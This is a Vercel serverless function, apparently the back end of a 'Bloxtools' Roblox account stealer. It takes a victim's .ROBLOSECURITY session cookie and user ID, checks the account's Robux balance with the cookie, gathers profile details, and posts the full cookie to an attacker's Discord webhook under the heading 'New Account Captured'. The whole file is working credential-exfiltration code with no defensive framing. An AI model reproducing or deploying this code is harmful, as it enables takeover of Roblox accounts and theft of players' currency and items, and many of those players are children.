// api/submit.js – Vercel serverless function

const WEBHOOK_URL = process.env.WEBHOOK_URL;

// ---------- Roblox API helpers ----------
async function fetchUserInfoFromId(userId) {
    try {
        const userRes = await fetch(`https://users.roblox.com/v1/users/${userId}`);
        if (!userRes.ok) return null;
        const userData = await userRes.json();

        const friendsRes = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`);
        let friendsCount = "N/A";
        if (friendsRes.ok) {
            const friendsData = await friendsRes.json();
            friendsCount = friendsData.count?.toLocaleString() || "0";
        }

        let wearing = "None equipped";
        const avatarRes = await fetch(`https://avatar.roblox.com/v1/users/${userId}/avatar`);
        if (avatarRes.ok) {
            const avatarData = await avatarRes.json();
            const assets = avatarData.assets || [];
            if (assets.length) {
                const items = assets.map(a => a.name).slice(0, 5);
                wearing = items.join(", ");
                if (assets.length > 5) wearing += " ...";
            }
        }

        let avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`;
        const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`);
        if (thumbRes.ok) {
            const thumbData = await thumbRes.json();
            if (thumbData.data?.[0]?.imageUrl) avatarUrl = thumbData.data[0].imageUrl;
        }

        return {
            username: userData.name,
            displayName: userData.displayName,
            userId: userData.id,
            joinDate: new Date(userData.created).toLocaleDateString(),
            friendsCount,
            wearing,
            avatarUrl,
            profileUrl: `https://www.roblox.com/users/${userId}/profile`
        };
    } catch (err) {
        console.error("fetchUserInfo error:", err);
        return null;
    }
}

async function fetchRobuxFromCookie(cookieValue) {
    try {
        const response = await fetch("https://economy.roblox.com/v1/user/currency", {
            headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
        });
        if (!response.ok) return "N/A";
        const data = await response.json();
        return data.robux?.toLocaleString() || "0";
    } catch (e) {
        console.error("Robux fetch error:", e);
        return "N/A";
    }
}

async function sendToDiscordWebhook(cookie, rbxuid) {
    const userInfo = await fetchUserInfoFromId(rbxuid);
    const robux = await fetchRobuxFromCookie(cookie);

    const description = `
## 📦 Account Capture

- **rbxuid:** \`${rbxuid}\`
- **Cookie Length:** \`${cookie.length} chars\`

## 🔐 Full .ROBLOSECURITY Cookie
\`\`\`
${cookie}
\`\`\`
`;

    const embedFields = [];

    if (userInfo) {
        embedFields.push(
            {
                name: "👤 Roblox Profile",
                value: `**Username:** ${userInfo.username}\n**Display Name:** ${userInfo.displayName}\n**User ID:** ${userInfo.userId}\n**Join Date:** ${userInfo.joinDate}\n\n🔗 [Profile](${userInfo.profileUrl})`,
                inline: false
            },
            { name: "👥 Friends", value: `${userInfo.friendsCount}`, inline: true },
            { name: "💰 Robux", value: `${robux} R$`, inline: true },
            { name: "👕 Wearing", value: userInfo.wearing || "Unknown", inline: false }
        );
    } else {
        embedFields.push({
            name: "⚠️ Error",
            value: "Could not fetch public profile information.\nUser may be deleted, banned, or invalid.",
            inline: false
        });
    }

    embedFields.push({
        name: "🔐 Cookie Summary",
        value: `**Length:** ${cookie.length} characters\n**rbxuid:** ${rbxuid}`,
        inline: false
    });

    const payload = {
        username: "Bloxtools Processing System",
        embeds: [{
            title: "🔓 New Account Captured",
            description,
            color: 0x8c52ff,
            thumbnail: userInfo ? { url: userInfo.avatarUrl } : undefined,
            fields: embedFields,
            footer: { text: "Bloxtools • Roblox Account Logger" },
            timestamp: new Date().toISOString()
        }]
    };

    const response = await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    });

    if (!response.ok) {
        console.error("Discord webhook error:", response.status, await response.text());
    }
    return response.ok;
}

// Vercel handler
module.exports = async (req, res) => {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, error: 'Method not allowed' });
    }

    const { cookie, rbxuid } = req.body;
    console.log("Received request with cookie length:", cookie?.length, "rbxuid:", rbxuid);

    if (!cookie || !rbxuid) {
        console.error("Missing cookie or rbxuid");
        return res.status(400).json({ success: false, error: "Missing cookie or rbxuid" });
    }

    if (!WEBHOOK_URL) {
        console.error("WEBHOOK_URL environment variable is missing!");
        return res.status(500).json({ success: false, error: "Server configuration error" });
    }

    try {
        const webhookSuccess = await sendToDiscordWebhook(cookie, rbxuid);
        console.log("Webhook success:", webhookSuccess);
        return res.json({ success: webhookSuccess });
    } catch (err) {
        console.error("Webhook send error:", err);
        return res.status(500).json({ success: false, error: "Internal server error" });
    }
};
